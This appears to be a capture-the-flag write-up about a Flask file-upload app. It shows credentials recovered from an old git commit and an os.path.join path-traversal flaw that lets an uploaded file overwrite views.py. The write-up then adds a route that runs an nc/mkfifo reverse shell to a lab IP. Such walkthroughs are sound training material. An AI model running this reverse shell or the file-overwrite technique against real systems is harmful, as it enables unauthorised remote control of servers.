## Static code analyses
Download the zip file containing the source code and unzip it. There a couple of interesting things:
- 1: The source code has a `.git` directory indicating some form of version control
- 2: There is a vulnerability in the source code for overwriting files on the web app's server
### 1: Credentials via version control
Use a desktop version control app to look at the source code. After doing some poking around, find some credentials present in an old commit.
![[Pasted image 20220909140622.png]]
`dev01:Soulless_Developer#2022`
### 2: Reverse shell via file overwriting
Do some poking around in the application's source code and find the `views.py` file, which drives the upcloud application.
- The interesting function here is upload_file()
```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app

[TRUNCATED]

@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


[TRUNCATED]
```
- This function will save the uploaded file to a path that uses the raw, unsanitized file name.
- Funny enough, if the path.join function from python's os module sees an absolute path for the last parameter, it will only use the last parameter.
```python
# e.g. 
file_name = 'some_path'
os.path.join("public", "uploads", file_name) -> public/uploads/some_path

file_name = '/some_path'
os.path.join("public", "uploads", file_name) -> /some_path
```
I can use this vulnerability along with my knowledge of how the web app's files are arranged (thanks to the source code) to overwrite `views.py`
I add this function to the bottom of `views.py`:
```python
@app.route('/unique_thing')
def thing():
        os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 9001 >/tmp/f")
            return render_template('index.html')
```
This will give a reverse shell when I navigate to `/unique_thing`